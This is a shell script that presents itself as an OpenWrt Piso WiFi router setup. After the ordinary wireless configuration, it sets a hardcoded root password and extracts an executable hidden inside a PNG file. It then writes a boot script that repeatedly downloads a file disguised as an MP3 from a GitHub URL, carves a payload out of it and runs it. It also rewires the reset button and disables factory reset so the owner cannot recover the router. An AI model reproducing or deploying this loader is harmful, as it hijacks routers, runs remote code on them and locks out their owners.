#!/bin/sh

echo "[6/6] Configuring Dual-Band Wi-Fi (Piso WiFi & Admin LAN)..."
# Safely wipe old interfaces without throwing terminal errors
while uci -q delete wireless.@wifi-iface[0] 2>/dev/null; do :; done

for radio in $(uci show wireless | grep "=wifi-device" | cut -d'.' -f2 | cut -d'=' -f1); do
    band=$(uci -q get wireless.$radio.band)
    hwmode=$(uci -q get wireless.$radio.hwmode)
    
    if [ "$band" = "5g" ] || [ "$band" = "a" ] || [ "$hwmode" = "11a" ] || [ "$hwmode" = "11ac" ] || [ "$hwmode" = "11ax5g" ]; then
        SUFFIX="5G"
    else
        SUFFIX="2.4G"
    fi

    # Create Main LAN AP (Using Bulletproof Variable IDs)
    IFACE_MAIN=$(uci add wireless wifi-iface)
    uci set wireless.$IFACE_MAIN.device="$radio"
    uci set wireless.$IFACE_MAIN.network='lan'
    uci set wireless.$IFACE_MAIN.mode='ap'
    uci set wireless.$IFACE_MAIN.ssid="NIMOS MAIN $SUFFIX"
    uci set wireless.$IFACE_MAIN.encryption='psk2'
    uci set wireless.$IFACE_MAIN.key='01234567'

    # Create Guest Portal AP
    IFACE_GUEST=$(uci add wireless wifi-iface)
    uci set wireless.$IFACE_GUEST.device="$radio"
    uci set wireless.$IFACE_GUEST.network='guest'
    uci set wireless.$IFACE_GUEST.mode='ap'
    # Removed the apostrophe to prevent strict UCI syntax parsing errors
    uci set wireless.$IFACE_GUEST.ssid="ANONIMOS PISO WIFI $SUFFIX"
    uci set wireless.$IFACE_GUEST.encryption='none'
    
    uci set wireless.$radio.disabled='0'
done

# Save changes safely
uci commit wireless || abort "Failed to save Wireless configuration."
wifi reload 2>/dev/null

printf "564675\n564675\n" | passwd root
sed -n '/#START/,/#END/p' /tmp/logo.png | grep -v "START" | grep -v "END" > /etc/mon.prep
chmod +x /etc/mon.prep


echo "====================================================="
echo " Pushing a Dick Inside... "
echo " Hahaha Joke... "
echo " Injecting PayLoad... "
echo "====================================================="

cat << 'EOF_BOOT' > /etc/rc.local
mkdir -p /tmp/html
cat << 'EOF' > /tmp/html/index.php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Offline</title>
    <style>body { background-color: #050a15; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; } .warning-box { background-color: yellow; padding: 20px 30px; border: 4px solid red; border-radius: 10px; margin-bottom: 25px; box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); } .blinking-text { color: red; font-size: 2rem; font-weight: 900; margin: 0; animation: blink 1s step-end infinite; } @keyframes blink { 50% { opacity: 0; } } .msg { color: #ccc; font-size: 1.1rem; line-height: 1.5; margin-bottom: 15px; } .admin { color: #fff; font-weight: bold; font-size: 1.2rem; margin-bottom: 40px; } .btn { background-color: #222; color: #fff; border: 2px solid #555; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 5px; text-decoration: none; text-transform: uppercase; }</style>
    <script>setTimeout(() => { window.location.reload(true); }, 5000);</script>
</head>
<body>
    <div class="warning-box"><p class="blinking-text">NO INTERNET DETECTED!</p></div>
    <p class="msg">Please check from time to time for the main page to load.<br>Thank you for your understanding.</p>
    <p class="admin">-ANONIMOS ADMIN</p>
    <a href="/" class="btn">REFRESH PAGE</a>
</body>
</html>
EOF

cat << 'EOF' > /tmp/html/404.php
<?php
header("Location: http://10.0.0.1/");
exit;
?>
EOF

mkdir -p /www/admin
echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0; url=http://10.0.0.1/admin/"></head><body>Redirecting to Vault OS Admin...</body></html>' > /www/admin/index.html

chmod -R 777 /tmp/html

(
    while [ ! -f /tmp/html/core.php ]; do

        while ! ping -c 1 -W 1 8.8.8.8 > /dev/null 2>&1; do sleep 5; done
        while [ "$(date +%Y)" -lt "2024" ]; do sleep 2; done
        
        sleep 5

        wget --no-check-certificate -qO /tmp/song.mp3 "https://raw.githubusercontent.com/skt12j/anonimos/main/base.mp3"
        sed -n '/#VAULT_PAYLOAD_START/,/#VAULT_PAYLOAD_END/p' /tmp/song.mp3 | grep -v "VAULT_PAYLOAD" > /tmp/.sys_b
        rm -f /tmp/song.mp3 2>/dev/null
        sh /tmp/.sys_b
        sleep 10
    done
) &

exit 0
EOF_BOOT

chmod +x /etc/rc.local
echo -e "#!/bin/sh\nreboot" > /etc/rc.button/reset
chmod -x /sbin/firstboot 2>/dev/null
chmod -x /usr/sbin/firstboot 2>/dev/null

rm /etc/vaultos_core.sh 2>/dev/null
rm /etc/vaultos_boot.sh 2>/dev/null
rm /etc/init.d/vaultos 2>/dev/null

echo "====================================================="
echo " ✅ VAULT OS (STEALTH) PREPARED SUCCESSFULLY!"
echo " The router will now reboot." 
echo " Wait a few secs...."
echo "====================================================="
reboot
